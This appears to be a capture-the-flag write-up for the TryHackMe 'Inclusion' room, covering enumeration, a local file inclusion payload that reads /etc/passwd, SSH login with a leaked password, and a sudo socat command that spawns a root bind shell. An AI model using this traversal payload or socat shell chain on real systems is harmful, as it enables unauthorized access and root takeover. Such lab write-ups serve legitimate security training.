# LFI \(L\)

_TryHackMe_ – [**Inclusion**](https://tryhackme.com/room/inclusion) Write-Up

_topics_: web application attacks \(LFI/RFI\), active info gathering, Linux privilege escalation

1. **Plan**
2. **Enumeration**
3. **Local Privilege Escalation**
4. **Exploitation \(Root PrivEsc\)**

new tools: nmapAutomater, socat

tools: firefox browser, terminal, gobuster/dirsearch, sudo

## 1\) Plan

We are to look for a file inclusion vulnerability in this web page. We will enumerate with nmapAutomator to see which ports are open and what OS it is running. Remember, we need to look for the ?_parameter=_ in order to exploit via file inclusion.

## 2\) Enumeration

`./nmapAutomator.sh Basic` returns:

PORT STATE SERVICE VERSION

**22/tcp open ssh** OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 \(Ubuntu Linux; protocol 2.0\)

**80/tcp open http** Werkzeug httpd 0.16.0 \(Python 3.6.9\)

so SSH and HTTP are open. Critical, but we are looking for an LFI vulnerability.

The THM lfibasics room suggests to look for “?” in the URL source code, as the “?” is often an indication preceding a _file_ parameter that can read system files. Checking for this yields a **/article?name=** page that loads articles on the website.

Further testing \(directory path traversal\) with the users file leads to three directories out \(trial and error\). **http://&lt;ip&gt;/article?name=../../../etc/passwd** prints the user page. This will be the attack vector for the file inclusion vulnerability.

## 3\) Local Privilege Escalation

**http://&lt;ip&gt;/article?name=../../../etc/passwd**

Because we are able to view the users file, this gives us low level access to print files from the system. Conveiently, the user falconfeast has their password listed in the users file as rootpassword. Because SSH is open, we can SSH into their account with this password and obtain a low level shell with falconfeast permissions.

`ssh falconfeast@<victimIP> -p22`

## 4\) Exploitation \(Root PrivEsc\)

Using the standard method of Linux Privilege Escalation techniques, first we check for sudo permissions and SUID files, as these are common attack vectors to root machines. Using our low-level shell: `sudo -l` yields that /usr/bin/socat has root NOPASSWD permissions. So we potentially can open a shell with root privileges using socat.

Searching GTFObins did not yield a straightforward answer \(though they usually do\) so instead I googled socat sudo permissions, this lead me to a webpage that explains:

_on victim_: `sudo socat TCP4-LISTEN:1234,reuseaddr EXEC:"/bin/sh"`

* TCP4-LISTEN:&lt;port&gt;: listens on a port and accepts TCP connections wth IPv4
* reuseaddr: Allows other sockets to bind to an address even if already in use
* EXEC:”/bin/sh”: forks subprocess that establishes communication with its parent process and invokes the specified program, aka a shell.

_on attacker_: `socat – TCP4:<victimIP>:1234`

this returns a bind shell \(established on target sent back to attacker\) running with root privileges, compromising the machine and giving us root access.

